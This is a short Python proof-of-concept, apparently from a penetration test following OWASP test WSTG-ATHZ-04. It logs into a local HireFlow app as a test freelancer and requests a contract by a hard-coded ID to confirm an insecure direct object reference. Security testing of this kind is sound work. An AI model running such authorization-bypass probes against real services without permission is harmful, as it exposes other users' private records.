"""
WSTG-ATHZ-04: Insecure Direct Object Reference — Contract Access
Demonstrates that authenticated users can access contracts they are not part of.
Expected: 200 response with contract details even when user is not a party
"""
import requests

BASE = "http://localhost:3000"

# Login as freelancer
freelancer_login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testfreelancer@hireflow.com",
    "password": "password123"
})
freelancer_token = freelancer_login.json()["token"]

# Get a contract ID (could be from another user)
# Using a known contract ID from testing
contract_id = "9d1ffbb3-d1f4-469c-b647-fb5ed0f0a84f"

# Try to access the contract as a different user
resp = requests.get(
    f"{BASE}/api/contracts/{contract_id}",
    headers={"Authorization": f"Bearer {freelancer_token}"}
)

print(f"Status: {resp.status_code}")
contract = resp.json()
print(f"Contract: {contract}")

assert resp.status_code == 200, "Expected 200 — IDOR not present"
assert "title" in contract, "Expected title in response"

# Check if this user is actually part of the contract
is_party = (contract.get("client_id") == freelancer_login.json()["user"]["id"] or
            contract.get("freelancer_id") == freelancer_login.json()["user"]["id"])

print(f"\n[VULNERABLE] Contract IDOR confirmed")
print(f"Contract title: {contract.get('title')}")
print(f"Client ID: {contract.get('client_id')}")
print(f"Freelancer ID: {contract.get('freelancer_id')}")
print(f"Current user ID: {freelancer_login.json()['user']['id']}")
print(f"Is current user a party to this contract? {is_party}")
if not is_party:
    print("\n>>> USER IS NOT A PARTY TO THIS CONTRACT BUT CAN VIEW IT! <<<")
